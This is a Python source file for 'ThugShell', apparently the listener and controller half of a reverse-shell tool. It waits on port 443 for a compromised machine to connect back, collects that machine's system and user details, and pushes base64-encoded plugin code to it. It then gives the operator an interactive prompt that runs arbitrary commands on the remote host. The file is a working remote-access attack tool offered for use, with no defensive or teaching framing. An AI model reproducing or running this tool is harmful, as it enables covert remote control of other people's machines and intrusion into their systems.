#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""ThugShell v1.0
Usage:
    thug_shell.py [--port <port>] [--ip <ip>] 
    thug_shell.py (-h | --help)

Options:
    -h --help           Show this screen
    --port <port>       Port number to listen on to to connect to the remote host on [default: 443]
    --ip <ip>           ip to listen on for reverse shells [default: 0.0.0.0]
"""
import sys
import time
import os
import signal
import glob
import base64
import threading
from logger import red, blue, green, yellow, grey, lgrey, strike, underline, info, error, warn, output
from playsound import playsound
import readline

readline.parse_and_bind('tab: complete')
screen_width = int(os.popen('stty size', 'r').read().split()[1])

thug = u"""██████████████████████████
─██▄▀▄▀█████──██▄▀▄▀█████─
──▀██▄█▄██▀────▀██▄█▄██▀──
"""
def scroll_thug():
    thug_width = len(thug.split("\n")[0])
    for i in range(screen_width - thug_width -1, 1, -1):
        tmp = ""
        for t in thug.split("\n"):
            tmp += " " * i + t + " " * (screen_width - thug_width - i) + "\n"

        sys.stdout.write(tmp)
        sys.stdout.flush()
        time.sleep(0.05)
        if i != 2:
            print '\033[5A'

banner = grey(u"""
                ██████████████████████████
                ─██▄▀▄▀█████──██▄▀▄▀█████─
                ──▀██▄█▄██▀────▀██▄█▄██▀──
""") + red(u"""
___________.__                     _________.__           .__  .__   
\__    ___/|  |__  __ __  ____    /   _____/|  |__   ____ |  | |  |  
  |    |   |  |  \|  |  \/ ___\   \_____  \ |  |  \_/ __ \|  | |  |  
  |    |   |   Y  \  |  / /_/  >  /        \|   Y  \  ___/|  |_|  |__
  |____|   |___|  /____/\___  /  /_______  /|___|  /\___  >____/____/
                \/     /_____/           \/      \/     \/           
                (cause thats how we roll homie!)
""")

from docopt import docopt
import socket

commands = {
}

prev_data = ""

def send_data(conn, data):
    length = str(len(data)).zfill(16)
    conn.send(length + data)

def get_prev_data():
    global prev_data
    return prev_data

def recv_data(conn):
    global prev_data
    data = conn.recv(1024)
    data_len = long(data[:16])
    data = data[16:]
    while data_len > len(data):
        data += conn.recv(1024)

    prev_data = data
    return data

def transform_cmd(cmd, full_command):
    if cmd in commands.keys() and "transform" in commands[cmd].keys():
        return commands[cmd]["transform"](full_command)

    return full_command

def run_custom(cmd, full_command):
    if cmd in commands.keys() and "custom" in commands[cmd].keys():
        commands[cmd]["custom"](full_command)
        return True
    else:
        return False

def play_connection_sound():
    try:
        playsound(os.path.join(os.path.dirname(os.path.realpath(__file__)), "connection.wav"))
    except:
        pass

print banner

# Load plugins in global scope
info("Loading extensions...")
command_glob = os.path.join(os.path.dirname(os.path.realpath(__file__)), "commands", "*.py")
main = sys.modules[__name__]

for c in glob.glob(command_glob):
    cmd_name = os.path.basename(c).replace(".py", "")
    content = open(c, "r").read()
    exec(content)
    func = getattr(main, "server_" + cmd_name)

    transform = None
    custom = None
    try:
        transform = getattr(main, "server_" + cmd_name + "_transform")
    except Exception as ex:
        pass

    try:
        custom = getattr(main, "server_" + cmd_name + "_custom" )
    except:
        pass

    commands[cmd_name] = {"function": func, "content": base64.b64encode(content)}
    
    if transform:
        commands[cmd_name]["transform"] = transform

    if custom:
        commands[cmd_name]["custom"] = custom

args = docopt(__doc__, version="ThugShell 1.0")
port = int(args["--port"])
ip = args["--ip"]

if port == 443:
    warn("Using default port.")

info("Listening on  %s:%s...." % (blue(ip), blue(str(port)) ))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(100)
    client, addr = s.accept()
except:
    error("Error setting up socket...")
    sys.exit(0)

def signal_handler(signal, frame):
    warn("SIGINT recieved shutting down....")
    s.close()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

info("Conection received from [%s]\n" % yellow(addr[0]))
t = threading.Thread(target=play_connection_sound)
t.start()
scroll_thug()

info("Entering command prompt....")

sysinfo = recv_data(client)
sysinfo = sysinfo.split(",")

print "%s %s" % (yellow("Operating System:"), blue(sysinfo[0]))
print "%s %s" % (yellow("         Version:"), blue(sysinfo[3]))
print "%s %s" % (yellow("         Release:"), blue(sysinfo[2]))
print "%s %s" % (yellow("            Arch:"), blue(sysinfo[4]))
print "%s %s" % (yellow("        Hostname:"), blue(sysinfo[1]))
print "%s %s" % (yellow("            User:"), blue(sysinfo[5]))

info("Sending extensions...")

for key in commands.keys():
    cmd = "load %s %s" % (key, commands[key]["content"])
    send_data(client, cmd)
    data = recv_data(client)
    if data:
        info(data)

server_path = "./"
def set_server_path(path):
    global server_path
    server_path = path

def get_server_path():
    return server_path

send_data(client, "cd .")
commands["cd"]["function"]("cd .", recv_data(client))

while 1:
    command = raw_input(red(sysinfo[5]) + yellow("@") + blue(sysinfo[1]) + yellow(":" + get_server_path())+ green("> "))
    if command.strip() == "":
        continue

    keyword = command.split(" ")[0]
    try:
        if run_custom(keyword, command):
            continue
        
        if command == "show_output":
            print prev_data
            continue 

        send_data(client, transform_cmd(keyword, command))
        if command.lower() == "exit":
            s.close()
            sys.exit(0)
        else:
            data = recv_data(client)
            if keyword in commands.keys():
                print commands[keyword]["function"](command, data)
            else:
                print data
    except Exception as ex:
        error(ex)
